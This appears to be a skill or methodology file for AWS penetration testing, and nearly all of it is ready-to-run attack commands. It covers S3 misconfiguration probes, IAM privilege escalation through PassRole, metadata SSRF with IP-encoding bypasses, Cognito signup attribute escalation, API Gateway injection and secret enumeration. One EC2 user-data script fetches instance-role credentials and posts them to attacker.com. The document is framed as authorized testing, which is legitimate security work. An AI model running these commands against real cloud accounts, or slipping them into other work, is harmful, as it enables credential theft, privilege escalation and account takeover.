---
name: aws
description: AWS security testing covering S3 misconfig, IAM privilege escalation, Lambda injection, EC2 metadata SSRF, Cognito, and secrets exposure
---

# AWS Security Testing

Security testing methodology for Amazon Web Services. Focus on S3 bucket misconfiguration, IAM privilege escalation, Lambda injection, EC2 metadata SSRF, Cognito misconfig, and secrets exposure.

## Attack Surface

**Storage** - S3 buckets, EBS snapshots, EFS shares, RDS snapshots
**Identity** - IAM users/roles/policies, Cognito user/identity pools, SSO, STS
**Compute** - EC2 instances, Lambda functions, ECS/EKS tasks, Fargate
**Networking** - VPCs, security groups, API Gateway, CloudFront, ALB/NLB
**Secrets** - Secrets Manager, SSM Parameter Store, environment variables, KMS

## S3 Bucket Misconfiguration

```bash
# Public read check
aws s3 ls s3://BUCKET --no-sign-request
curl -s https://BUCKET.s3.amazonaws.com/ | head -50

# Public write check
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://BUCKET/pentest-write-test.txt --no-sign-request

# Bucket policy analysis
aws s3api get-bucket-policy --bucket BUCKET --no-sign-request 2>/dev/null | python3 -m json.tool
aws s3api get-bucket-acl --bucket BUCKET --no-sign-request

# Check for dangerous policy conditions
# Look for: "Principal": "*", "Effect": "Allow" without proper Condition blocks
# Look for: s3:GetObject, s3:PutObject, s3:ListBucket with wildcard principal

# Enumerate bucket via DNS/HTTP patterns
for region in us-east-1 us-west-2 eu-west-1 ap-southeast-1; do
  curl -sI "https://BUCKET.s3.$region.amazonaws.com/" | head -1
done

# S3 bucket policy bypass via presigned URL manipulation
# Test if presigned URLs leak or are generated with overly broad permissions
```

## IAM Privilege Escalation

```bash
# Enumerate current permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
# Use enumerate-iam for comprehensive enumeration
python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET

# iam:PassRole + lambda:CreateFunction = admin
aws lambda create-function --function-name pwned --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/ADMIN_ROLE \
  --handler index.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name pwned /tmp/output.txt

# iam:PassRole + ec2:RunInstances = credential theft via user-data
aws ec2 run-instances --image-id ami-0abcdef --instance-type t2.micro \
  --iam-instance-profile Arn=arn:aws:iam::ACCOUNT:instance-profile/ADMIN_PROFILE \
  --user-data '#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME > /tmp/creds
curl https://attacker.com/exfil -d @/tmp/creds'

# sts:AssumeRole chain escalation
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/TARGET_ROLE \
  --role-session-name pentest

# Common escalation paths with Pacu
pacu
> import_keys AKIA... SECRET
> run iam__enum_permissions
> run iam__privesc_scan
```

## EC2 Metadata SSRF

```bash
# IMDSv1 (no token required - most dangerous)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
curl -s http://169.254.169.254/latest/user-data

# IMDSv2 (requires PUT with TTL header - blocks most SSRF)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Check if IMDSv2 is enforced (HttpTokens: required vs optional)
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens]' --output table

# ECS task credentials (different endpoint)
curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# SSRF bypass for metadata - IP encoding tricks
curl http://0xA9FEA9FE/latest/meta-data/        # hex encoding
curl http://2852039166/latest/meta-data/          # decimal encoding
curl http://[::ffff:169.254.169.254]/latest/meta-data/  # IPv6 mapped
```

## Lambda Injection

```bash
# Event injection via unsanitized input
# If Lambda processes API Gateway events without validation:
# Inject via query params, headers, body that flow to shell/SQL/SSRF

# Environment variable leakage
# Lambda env vars contain: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# Trigger error to leak env in stack trace
curl -X POST https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint \
  -d '{"__proto__":{"constructor":{"prototype":{"env":true}}}}'

# Lambda function URL with no auth
curl -s https://FUNCTION_URL.lambda-url.REGION.on.aws/

# Check Lambda resource policy for overly permissive access
aws lambda get-policy --function-name FUNCTION_NAME
```

## Cognito Misconfiguration

```bash
# Self-signup enabled when it shouldn't be
aws cognito-idp sign-up --client-id CLIENT_ID --username attacker@evil.com \
  --password 'P@ssw0rd123!' --region REGION

# Unauthenticated identity pool access
aws cognito-identity get-id --identity-pool-id REGION:POOL_ID --region REGION
aws cognito-identity get-credentials-for-identity --identity-id IDENTITY_ID --region REGION

# Custom attribute manipulation during signup (role escalation)
aws cognito-idp sign-up --client-id CLIENT_ID --username attacker@evil.com \
  --password 'P@ssw0rd123!' \
  --user-attributes Name=custom:role,Value=admin Name=email,Value=attacker@evil.com

# Check if client secret is required (often missing = anyone can auth)
aws cognito-idp describe-user-pool-client --user-pool-id POOL_ID --client-id CLIENT_ID --region REGION
```

## API Gateway Bypass

```bash
# Missing authorizer on specific methods/resources
curl -X OPTIONS https://API_ID.execute-api.REGION.amazonaws.com/prod/admin
curl -X PUT https://API_ID.execute-api.REGION.amazonaws.com/prod/admin

# Stage variable injection
curl https://API_ID.execute-api.REGION.amazonaws.com/prod%0a%0dstageVariable/admin

# Direct Lambda invocation bypassing API Gateway auth
aws lambda invoke --function-name BACKEND_FUNCTION --payload '{"httpMethod":"GET","path":"/admin"}' /tmp/out.txt
```

## Secrets Exposure

```bash
# Secrets Manager enumeration
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Check CloudFormation outputs and parameters for hardcoded secrets
aws cloudformation describe-stacks --query 'Stacks[].Outputs[]'
aws cloudformation get-template --stack-name STACK_NAME

# Lambda environment variables
aws lambda get-function-configuration --function-name FUNCTION_NAME --query 'Environment.Variables'

# EC2 user-data (often contains bootstrap secrets)
aws ec2 describe-instance-attribute --instance-id i-XXXXX --attribute userData \
  --query 'UserData.Value' --output text | base64 -d
```

## Tools

```bash
# ScoutSuite - multi-cloud security audit
scout aws --profile pentest

# Prowler - AWS security best practices
prowler aws -M json

# Pacu - AWS exploitation framework
pacu  # interactive shell with modules for enum, privesc, persistence

# enumerate-iam - brute force IAM permissions
python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET
```

## Testing Methodology

1. **Credential discovery** - Find AWS keys in source code, env vars, metadata, CI/CD configs
2. **Permission enumeration** - Map all IAM permissions for discovered credentials
3. **S3 audit** - Test all discoverable buckets for public read/write/list
4. **Metadata access** - Check IMDSv1 availability, ECS credential endpoints
5. **Privilege escalation** - Test iam:PassRole chains, sts:AssumeRole paths, policy manipulation
6. **Cognito testing** - Check self-signup, unauthenticated pools, attribute manipulation
7. **Lambda/API Gateway** - Test for event injection, missing authorizers, direct invocation
8. **Secrets audit** - Enumerate Secrets Manager, SSM, CloudFormation, Lambda env vars, user-data

## Validation

- Demonstrate S3 access with specific bucket contents or successful write
- Show credential retrieval from metadata endpoints
- Prove IAM escalation by assuming higher-privilege role or creating resources
- Document Cognito self-signup or unauthenticated credential issuance
- Show secrets retrieved from SSM, Secrets Manager, or environment variables
